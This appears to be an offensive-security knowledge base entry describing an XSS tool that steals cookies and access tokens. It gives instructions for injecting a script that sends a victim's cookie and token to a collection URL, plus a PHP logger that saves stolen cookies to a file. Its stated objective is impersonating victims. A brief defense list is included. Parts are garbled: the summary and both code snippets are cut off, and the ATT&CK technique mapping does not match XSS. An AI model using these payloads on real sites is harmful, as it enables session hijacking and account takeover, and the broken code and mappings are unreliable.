---
id: a3e38950-9bde-4add-bfc7-76b79f8e4529
name: XSS Cookie and Access Token Grabber
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:41.639882+00:00'
updated_at: '2023-04-10T20:21:43.593861+00:00'
tactics:
- '[[Collection|TA0009 - Collection]]'
- '[[Initial Access|TA0001 - Initial Access]]'
techniques:
- '[[Hardware Additions|T1200 - Hardware Additions]]'
- '[[Screen Capture|T1113 - Screen Capture]]'
tags:
- '[[Cross Site Scripting]]'
- '[[Data grabber for XSS]]'
- '[[Exploit code or POC]]'
---

# XSS Cookie and Access Token Grabber

## Summary

The XSS Cookie and Access Token Grabber is a tool used to exploit cross-site scripting vulnerabilities within a web application. The tool allows an attacker to execute arbitrary code on the victim's browser, which can be used to steal sensitive information such as cookies and access tokens. The att

## Description

# Description

The XSS Cookie and Access Token Grabber is a tool used to exploit cross-site scripting vulnerabilities within a web application. The tool allows an attacker to execute arbitrary code on the victim's browser, which can be used to steal sensitive information such as cookies and access tokens. The attacker can then use this information to impersonate the victim and gain unauthorized access to the victim's account. This tool can be used as a part of a larger attack campaign to gain initial access to a target system or to collect sensitive data from a victim.

Technical Explanation: The tool works by injecting malicious code into a vulnerable web application. When a victim visits the web page, the malicious code is executed on the victim's browser, allowing the attacker to steal sensitive information. The tool is designed to be easy to use and can be used by attackers with minimal technical knowledge.

Business Value: The XSS Cookie and Access Token Grabber can be used by attackers to gain unauthorized access to sensitive information, which can be used for financial gain or to gain a competitive advantage over a target organization.

## Requirements

1. Access to a vulnerable web application

1. Ability to inject malicious code into the web application

## Defense

1. Implement input validation and output encoding to prevent XSS vulnerabilities

1. Use HTTPOnly and Secure flags for cookies to prevent theft

1. Implement multi-factor authentication to prevent unauthorized access

## Objectives

1. Steal cookies and access tokens from a victim's browser

1. Impersonate the victim and gain unauthorized access to their account

# Instructions

1. To use this command, you need to inject the code into a website that is vulnerable to XSS attacks. Once injected, the code will grab the user's cookie and access token and send it to the specified URLs. Be careful not to use this code for malicious purposes.

**Code**: [[<script>document.location='http://localhost/XSS/gr]]

> The code in the 'data' field contains multiple commands that are executed when the injected code is executed on a vulnerable website. The first two commands grab the user's cookie and access token and send it to the specified URLs using 'document.location'. The second two commands do the same thing, but use 'new Image().src' instead. The 'lang' field specifies that the code is written in HTML. The 'text' field provides a brief explanation of what XSS is and what it can be used for. The 'instruction' field provides detailed instructions on how to use the code. The 'explain' field provides a more detailed explanation of what the code does and how it works.

2. Use this command to write the collected cookie data into a file. The command will take the cookie data as input and append it to a file named 'cookies.txt'.

**Code**: [[<?php
$cookie = $_GET['c'];
$fp = fopen('cookies.t]]

> This command takes a single argument 'c' which is the cookie data to be written to the file. The command first opens the file 'cookies.txt' in append mode and then writes the cookie data to the file along with a label 'Cookie:' to identify the data. Finally, the file is closed.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection|TA0009 - Collection]]
- [[Initial Access|TA0001 - Initial Access]]

### Techniques

- [[Hardware Additions|T1200 - Hardware Additions]]
- [[Screen Capture|T1113 - Screen Capture]]

## Tags

- [[Cross Site Scripting]]
- [[Data grabber for XSS]]
- [[Exploit code or POC]]
